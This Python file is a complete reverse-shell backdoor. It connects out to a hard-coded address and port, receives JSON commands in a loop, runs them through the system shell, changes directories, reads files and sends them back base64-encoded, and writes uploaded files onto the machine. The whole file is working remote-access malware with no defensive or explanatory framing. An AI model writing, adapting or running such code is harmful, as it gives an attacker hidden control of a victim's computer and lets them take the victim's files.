import socket
import subprocess
import json
import os
import base64

class MySocket:
    def __init__(self, ip, port):
        self.my_connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connect.connect((ip, port))

    def command_exec(self, command):
        return subprocess.check_output(command, shell=True)

    def json_send(self, data):
        json_data = json.dumps(data)
        self.my_connect.send(json_data.encode())

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.my_connect.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_cd_command(self, directory):
        os.chdir(directory)
        return "Changed directory to " + directory

    def get_file_contents(self, path):
        with open(path, "rb") as myfile:
            return base64.b64encode(myfile.read()).decode('utf-8')

    def save_file(self, path, content):
        with open(path, "wb") as myfile:
            myfile.write(base64.b64decode(content))
        return "File uploaded successfully"

    def start_socket(self):
        while True:
            command = self.json_receive()  # Receive command from the server
            try:
                if command[0] == "quit":
                    self.my_connect.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.execute_cd_command(command[1])
                elif command[0] == "download":
                    command_output = self.get_file_contents(command[1])
                elif command[0] == "upload" and len(command) > 2:
                    command_output = self.save_file(command[1], command[2])
                else:
                    command_output = self.command_exec(command)
                    
                if isinstance(command_output, bytes):
                    command_output = command_output.decode('latin1')
            except Exception:
                command_output="Error!"
            self.json_send(command_output)
        self.my_connect.close()

my_socket = MySocket("192.168.1.110", 8080)
my_socket.start_socket()
